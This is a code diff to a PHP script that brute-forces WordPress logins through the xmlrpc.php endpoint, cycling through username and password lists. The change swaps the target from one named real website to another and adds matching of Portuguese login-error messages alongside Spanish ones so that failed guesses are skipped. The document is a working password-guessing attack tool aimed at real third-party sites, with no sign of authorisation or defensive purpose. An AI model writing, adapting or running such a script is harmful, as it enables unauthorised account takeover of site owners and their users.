@@ -2,7 +2,7 @@
 
 require 'vendor/autoload.php';
 
-$domain = 'http://partidopirata.com.ar';
+$domain = 'http://edt.org.br';
 $endpoint = $domain . "/xmlrpc.php";
 
 $users_file = 'users.txt';
@@ -15,7 +15,13 @@ $passwords = file($passwords_file);
 echo "Users file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";
 
 function is_not_login_error($e) {
-  return strpos($e->getMessage(), 'Usuario') === false && strpos($e->getMessage(), 'incorrecta') === false;
+  if ( strpos($e->getMessage(), 'Usuario') !== false && strpos($e->getMessage(), 'incorrecta') !== false )
+    return false;
+
+  if ( strpos($e->getMessage(), 'Nome') !== false && strpos($e->getMessage(), 'senha') !== false )
+    return false;
+
+  return true;
 }
 
 foreach ( $users as $user ) {
@@ -33,7 +39,7 @@ foreach ( $users as $user ) {
 
     } catch ( Exception $e ) {
       if ( is_not_login_error($e) ) {
-        var_dump($e);
+        echo $e->getMessage() . "\n\n";
       }
     }
   }
